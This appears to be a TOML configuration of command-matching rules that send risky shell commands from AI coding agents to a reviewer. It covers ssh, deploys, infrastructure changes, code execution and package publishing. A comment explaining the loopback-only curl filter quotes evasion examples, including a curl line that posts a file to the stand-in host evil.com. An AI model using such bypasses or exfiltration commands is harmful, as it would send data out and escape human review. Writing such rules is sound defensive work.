# Commands the hook leaves to the host reviewer (Claude Code auto mode
# classifier, Codex auto-review). A match overrides every allow rule, so these
# also carve exceptions out of broad allow rules such as `git-local-ops`.
# Commands that match no rule defer the same way.

# Shared regex fragments, substituted into `@name@` tokens by the rule
# engine before compilation (TOML has no string interpolation).
#
# `loopback_only` matches a curl/wget command whose HTTP mutation is aimed
# EXCLUSIVELY at a literal loopback host, requiring ALL of:
#   * a literal http(s)://localhost|127.0.0.1|[::1] followed by `:` or `/`
#     (rejects localhost.evil.com and userinfo tricks like localhost@evil.com)
#   * no `://` pointing at any other host
#   * no bare scheme-less host token (curl defaults it to http:// and applies
#     the same body to it: `curl -X POST http://localhost/ evil.com -d @f`)
#   * no `$` or backtick (the host cannot be swapped in via expansion)
#   * no reroute/rebind/proxy/config/second-request flags (-L, --location,
#     --resolve, --connect-to, --proxy, --preproxy, --interface, --dns-*,
#     --socks*, --next, -x, -K, --config)
[fragments]
not_version_query = '''(?!\s*(--version|-V|--help|-h)\s*$)'''
loopback_only = '''(?=.*https?://(localhost|127\.0\.0\.1|\[::1\])[:/])(?!.*://(?!(localhost|127\.0\.0\.1|\[::1\])[:/]))(?!.*\s(?![-./])[\w-]+(\.[\w-]+)+([:/]|\s|$))(?!.*[`$])(?!.*((?<!\S)-[a-zA-Z]*L|--location|--resolve|--connect-to|--proxy|--preproxy|--interface|--dns-|--socks|--next|(?<!\S)-x\s|(?<!\S)-K\s|--config))'''

# --- Remote / System Access ---

[[rules]]
name = "ssh"
command_regex = '''^\s*ssh\s+'''

[[rules]]
name = "systemctl"
command_regex = '''^\s*systemctl\s+'''

[[rules]]
name = "crontab-edit"
command_regex = '''^\s*crontab\s+(-e|-r)'''

# --- Deploy & Infrastructure Mutations ---

[[rules]]
name = "deploy"
command_regex = '''^\s*(?!(echo|cat|grep|rg|ag|find|head|tail|wc|sort|diff|git|ls|sed|awk|jq|python3?|node|file|strings)\s)(\S+\s+){0,2}deploy(\s|$)'''

[[rules]]
name = "terraform"
command_regex = '''^\s*terraform\s+(apply|destroy|import|state|taint|untaint|force-unlock)(\s|$)'''

[[rules]]
name = "pulumi"
command_regex = '''^\s*pulumi\s+(up|destroy|import|cancel|refresh)(\s|$)'''

[[rules]]
name = "kubectl-mutate"
command_regex = '''^\s*kubectl\s+(apply|delete|create|replace|patch|edit|rollout|scale|drain|cordon|uncordon|taint|untaint)(\s|$)'''

[[rules]]
name = "helm-mutate"
command_regex = '''^\s*helm\s+(install|upgrade|uninstall|rollback)(\s|$)'''

# --- Code Execution ---
# Commands that run code taken from their arguments, project files, or
# installed packages. A hook allow would let arbitrary code skip the host
# reviewer, and auto mode drops the equivalent allow rules for the same reason.
# `@not_version_query@` keeps bare `--version` / `--help` queries allowed.

[[rules]]
name = "script-interpreter"
command_regex = '''^\s*(python[\d.]*|node|deno|ruby|perl|php|bash|sh|zsh|dash|ksh|ash|fish)(\s|$)@not_version_query@'''

[[rules]]
name = "package-script"
command_regex = '''^\s*(npm|yarn|pnpm)\s+(run|run-script|test|t|start|restart|stop|exec|x|dlx|create|init|build|clean|lint|format|check)(\s|$)|^\s*bun\s+(run|test|x|create|init)(\s|$)'''

[[rules]]
name = "package-exec"
command_regex = '''^\s*(npx|pnpx|bunx|uvx)(\s|$)|^\s*uv\s+(run|tool\s+run)(\s|$)|^\s*pipx\s+run(\s|$)'''

[[rules]]
name = "toolchain-run"
command_regex = '''^\s*cargo\s+(run|r|test|t|bench)(\s|$)|^\s*go\s+(run|test|generate)(\s|$)|^\s*dotnet\s+(run|test|watch|vstest|\S*\.dll)(\s|$)'''

[[rules]]
name = "make"
command_regex = '''^\s*make(\s|$)@not_version_query@'''

[[rules]]
name = "firebase-emulators-exec"
command_regex = '''^\s*firebase\s+emulators:exec(\s|$)'''

# Read-only tools with a flag or statement that runs another program.
[[rules]]
name = "find-exec"
command_regex = '''^\s*find\s+.*\s-(exec|execdir|ok|okdir|delete)(\s|$)'''

[[rules]]
name = "awk-system"
command_regex = '''^\s*awk\s+.*(system\s*\(|\|\s*getline|printf?\b[^;}]*\|)'''

[[rules]]
name = "sqlite3-shell"
command_regex = '''^\s*sqlite3\s+.*\.(shell|system|load)\b'''

# --- Package Publishing ---

[[rules]]
name = "npm-publish"
command_regex = '''^\s*(npm|yarn|pnpm)\s+publish(\s|$)'''

[[rules]]
name = "gem-push"
command_regex = '''^\s*gem\s+push(\s|$)'''

[[rules]]
name = "twine-upload"
command_regex = '''^\s*twine\s+upload(\s|$)'''

# --- Python Toolchain Mutations ---

[[rules]]
name = "uv-mutate"
command_regex = '''^\s*uv\s+(pip\s+install|pip\s+uninstall|add|remove|tool\s+install|tool\s+uninstall|self\s+update|publish)(\s|$)'''

# --- Rust Toolchain Mutations ---

[[rules]]
name = "rustup-mutate"
command_regex = '''^\s*rustup\s+(update|self|install|uninstall|default|override|component|target|toolchain|run)(\s|$)'''

[[rules]]
